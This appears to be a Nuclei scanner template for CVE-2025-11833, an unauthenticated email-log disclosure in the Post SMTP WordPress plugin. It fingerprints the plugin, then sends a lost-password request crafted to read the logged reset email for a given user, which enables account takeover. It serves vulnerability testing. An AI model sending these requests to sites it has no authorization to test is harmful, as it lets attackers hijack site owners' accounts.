id: CVE-2025-11833

info:
  name: Post SMTP <= 3.6.0 - Missing Authorization to Account Takeover via Unauthenticated Email Log Disclosure
  author: Kazgangap
  severity: critical
  description: | 
    The Post SMTP Complete SMTP Solution with Logs, Alerts, Backup SMTP & Mobile App plugin for WordPress is vulnerable to unauthorized access of data due to a missing capability check on the __construct function in all versions up to, and including, 3.6.0. This makes it possible for unauthenticated attackers to read arbitrary logged emails sent through the Post SMTP plugin, including password reset emails containing password reset links, which can lead to account takeover.
  reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/post-smtp/post-smtp-complete-smtp-solution-with-logs-alerts-backup-smtp-mobile-app-360-missing-authorization-to-account-takeover-via-unauthenticated-email-log-disclosure
  tags: cve,cve2025

variables:
  valid_user: "{{valid_user}}"
  view_log_id: "{{view_log_id}}"

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /wp-content/plugins/post-smtp/readme.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(body, "Post SMTP")'
        condition: and
        internal: true

  - raw:
      - |
        POST /wp-login.php?action=lostpassword&page=postman_email_log&view=log&log_id={{view_log_id}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        user_login={{valid_user}}&redirect_to=&wp-submit=Get+New+Password
    
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(content_type, "text/html")'
          - 'len(body) > 0'
        condition: and

      - type: dsl
        dsl:
          - 'contains(body, "no account")'
        negative: true
